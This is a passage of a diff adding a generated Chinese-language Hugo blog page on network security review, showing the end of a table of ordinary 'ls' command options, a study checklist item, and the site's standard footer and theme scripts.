+</tr>
+<tr>
+<td style="text-align:center"><code>ls -la</code></td>
+<td style="text-align:center">以长列表格式显示所有文件和目录。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>ls -R</code></td>
+<td style="text-align:center">递归显示文件和目录。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>ls -r</code></td>
+<td style="text-align:center">反向排序文件。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>ls -X</code></td>
+<td style="text-align:center">按文件扩展名的字母顺序对文件进行排序。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>ls -tl</code></td>
+<td style="text-align:center">根据文件创建日期和时间显示文件。</td>
+</tr>
+<tr>
+<td style="text-align:center"><code>ls -n</code></td>
+<td style="text-align:center">列出 UID 和 GID。</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<ul>
+<li><i class="far fa-square fa-fw"></i> 👌结合所学知识，设计能够实现特定安全目标的通信方案。</li>
+</ul>
+</blockquote>
+</div>
+
+        
+
+<div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2024-07-03&nbsp;<a class="git-hash" href="https://github.com/Florae006/Florae006.github.io.git/commit/e0d14f2785186684aa70b8aed6f6dbeea4696b95" target="_blank" title="commit by 哆哆啦(flora_chen2021@163.com) e0d14f2785186684aa70b8aed6f6dbeea4696b95: init" rel="noopener noreferrer">
+                                    <i class="fas fa-hashtag fa-fw"></i>e0d14f2</a></span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/posts/cyber_security/index.md target="_blank" rel="noopener noreferrer">阅读原始文档</a>
+                    </span></div>
+            <div class="post-info-share">
+                <span><a href="#" title="分享到 Twitter" data-sharer="twitter" data-url="http://localhost:1313/posts/cyber_security/" data-title="复习||网络安全"><i class="fab fa-twitter fa-fw"></i></a><a href="#" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/cyber_security/"><i class="fab fa-facebook-square fa-fw"></i></a><a href="#" title="分享到 Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/posts/cyber_security/" data-title="复习||网络安全"><i class="fab fa-hacker-news fa-fw"></i></a><a href="#" title="分享到 Line" data-sharer="line" data-url="http://localhost:1313/posts/cyber_security/" data-title="复习||网络安全"><i data-svg-src="/lib/simple-icons/icons/line.min.svg"></i></a><a href="#" title="分享到 微博" data-sharer="weibo" data-url="http://localhost:1313/posts/cyber_security/" data-title="复习||网络安全"><i class="fab fa-weibo fa-fw"></i></a><a href="#" title="分享到 百度" data-sharer="baidu" data-url="http://localhost:1313/posts/cyber_security/" data-title="复习||网络安全"><i data-svg-src="/lib/simple-icons/icons/baidu.min.svg"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/nihonngo/" class="prev" rel="prev" title="基础日语1复习"><i class="fas fa-angle-left fa-fw"></i>基础日语1复习</a></div>
+</div>
+</article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.123.8">Hugo</a> 强力驱动&nbsp;|&nbsp;主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.3.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://dodolalorc.cn/" target="_blank" rel="noopener noreferrer">DODOLA</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span><span class="icp-splitter">&nbsp;|&nbsp;</span><br class="icp-br"/>
+                    <span class="icp"><p class="beian"><img class="beian-icon" src="/img/icons/govbeian.png"><a class="gov" href="https://beian.mps.gov.cn/#/query/webSearch?code=33010902003733" rel="noreferrer" title="浙公网安备33010902003733" target="_blank">浙公网安备33010902003733</a><a class="icp" href="https://beian.miit.gov.cn/#/Integrated/index" target="_blank" title="浙ICP备2023048052号-1">浙ICP备2023048052号-1</a></p></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/katex/copy-tex.min.css">
+        <noscript><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"></noscript><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"distance":100,"findAllMatches":null,"fuseIndexURL":"/index.json","highlightTag":"em","ignoreFieldNorm":null,"ignoreLocation":true,"isCaseSensitive":null,"location":null,"maxResultLength":10,"minMatchCharLength":1,"noResultsFound":"没有找到结果","snippetLength":50,"threshold":0.6,"type":"fuse","useExtendedSearch":null},"sharerjs":true,"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js" defer></script><script type="text/javascript" src="/lib/katex/auto-render.min.js" defer></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js" defer></script><script type="text/javascript" src="/lib/katex/mhchem.min.js" defer></script><script type="text/javascript" src="/js/katex.min.js" defer></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/twikoo@1.6.36/dist/twikoo.all.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script></div>
+</body>
+
+</html>
